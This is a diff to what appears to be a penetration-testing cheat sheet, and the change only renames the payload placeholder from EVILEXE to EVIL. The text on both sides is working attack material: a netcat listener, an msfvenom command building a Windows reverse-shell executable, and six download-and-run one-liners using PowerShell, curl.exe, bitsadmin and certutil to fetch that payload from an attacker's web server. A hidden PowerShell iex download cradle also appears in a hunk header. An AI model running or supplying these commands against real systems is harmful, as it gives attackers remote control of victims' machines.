@@ -108,7 +108,7 @@ powershell.exe -executionpolicy bypass -w hidden "iex(New-Object System.Net.WebC
 **Generic**
 ===========
 
-**Reverse via http**
+**Reverse with download from HTTP**
 ---------------------
 
 <details>
@@ -118,13 +118,13 @@ REVERSE_IP - IP target will be connecting to send reverse shell
 <br>
 REVERSE_PORT - Port host will open to recieve reverse shell
 <br>
-EVILEXE - name of EXE
+EVIL - name of EXE
 </p>
 </details>
 
 ```
 nc -nlvp REVERSE_PORT
-msfvenom -p windows/shell_reverse_tcp LHOST=REVERSE_IP LPORT=REVERSE_PORT –f exe -o EVILEXE.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=REVERSE_IP LPORT=REVERSE_PORT –f exe -o EVIL.exe
 python3 -m http.server MY_WEBPORT
 ```
 
@@ -135,32 +135,32 @@ REVERSE_IP - IP target will be connecting to send reverse shell
 <br>
 REVERSE_PORT - Port host will open to recieve reverse shell
 <br>
-EVILEXE - name of EXE
+EVIL - name of EXE
 </p>
 </details>
 
 ```
 \\POWERSHELL IWR
-Invoke-WebRequest -Uri http://REVERSE_IP:MY_WEBPORT/EVILEXE.exe -OutFile EVILEXE.exe
-EVILEXE.exe
+Invoke-WebRequest -Uri http://REVERSE_IP:MY_WEBPORT/EVIL.exe -OutFile EVIL.exe
+EVIL.exe
 
 \\POWERSHELL Webclient
-(New-Object System.Net.WebClient).DownloadFile(http://REVERSE_IP:MY_WEBPORT/EVILEXE.exe, EVILEXE.exe)
-EVILEXE.exe
+(New-Object System.Net.WebClient).DownloadFile(http://REVERSE_IP:MY_WEBPORT/EVIL.exe, EVIL.exe)
+EVIL.exe
 
 \\POWERSHELL BitsTransfer
-Start-BitsTransfer -Source http://REVERSE_IP:MY_WEBPORT/EVILEXE.exe -Destination EVILEXE.exe
-EVILEXE.exe
+Start-BitsTransfer -Source http://REVERSE_IP:MY_WEBPORT/EVIL.exe -Destination EVIL.exe
+EVIL.exe
 
 \\WIN10 curl.exe
-curl.exe --output EVILEXE.exe --url http://REVERSE_IP:MY_WEBPORT/EVILEXE.exe
-EVILEXE.exe
+curl.exe --output EVIL.exe --url http://REVERSE_IP:MY_WEBPORT/EVIL.exe
+EVIL.exe
 
 \\WINXP+ bitsadmin
-bitsadmin /transfer myDownloadJob /download /priority normal http://REVERSE_IP:MY_WEBPORT/EVILEXE.exe EVILEXE.exe
-EVILEXE.exe
+bitsadmin /transfer myDownloadJob /download /priority normal http://REVERSE_IP:MY_WEBPORT/EVIL.exe EVIL.exe
+EVIL.exe
 
 \\WINVISTA+ certutil
-certutil.exe -urlcache -split -f "http://REVERSE_IP:MY_WEBPORT/EVILEXE.exe" EVILEXE.exe
-EVILEXE.exe
+certutil.exe -urlcache -split -f "http://REVERSE_IP:MY_WEBPORT/EVIL.exe" EVIL.exe
+EVIL.exe
 ```
